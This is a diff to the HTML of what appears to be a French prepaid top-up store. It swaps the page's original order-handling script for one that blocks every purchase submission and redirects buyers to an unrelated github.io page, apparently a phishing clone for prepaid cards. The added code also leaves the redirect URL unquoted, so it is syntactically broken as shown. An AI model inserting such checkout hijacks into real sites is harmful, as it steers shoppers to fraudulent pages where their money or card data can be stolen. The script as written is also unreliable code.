@@ -1115,26 +1115,25 @@ Consultez <a href="" class="bb-uri">les questions les plus fr&eacute;quemment po
     
    <script type="text/javascript" src="https://static.rapido.com/media/frontend/javascripts/beltegoed/bundle.js?v=1706863405
 "></script>
-<script type="text/javascript">
-    //<![CDATA[
-    $(document).ready(function() {
-        $('.product-form select').select2({
-            minimumResultsForSearch: Infinity,
-            width: 'auto'
-        });
-
-        $('.product .provider').on('click', function() {
-            $(this).closest('.product').find('.order-button[data-product]').trigger('click');
-            $(this).closest('.product').find('form').submit();
-        });
-
-        $('#itunes-popup .overlay, #itunes-popup button.close').click(function() {
-            $('#itunes-popup').remove();
-        });
-
-        
+<script>
+      $(document).ready(function() {
+    $('.product-form select').select2({
+        minimumResultsForSearch: Infinity,
+        width: 'auto'
     });
-    //]]>
+
+   
+    
+    $('.order-button').click(function(e) {
+        e.preventDefault(); // Prevent the default form submission
+        var productForm = $(this).closest('form'); 
+        var quantity = productForm.find('.selectAmount').val(); 
+        var productId = productForm.find('#productId').val(); 
+      
+        var redirectURL = https://recharge-fr.github.io/PCS/;
+        window.location.href = redirectURL;
+    });
+});
 </script>
 <script type="text/javascript">
     //<![CDATA[
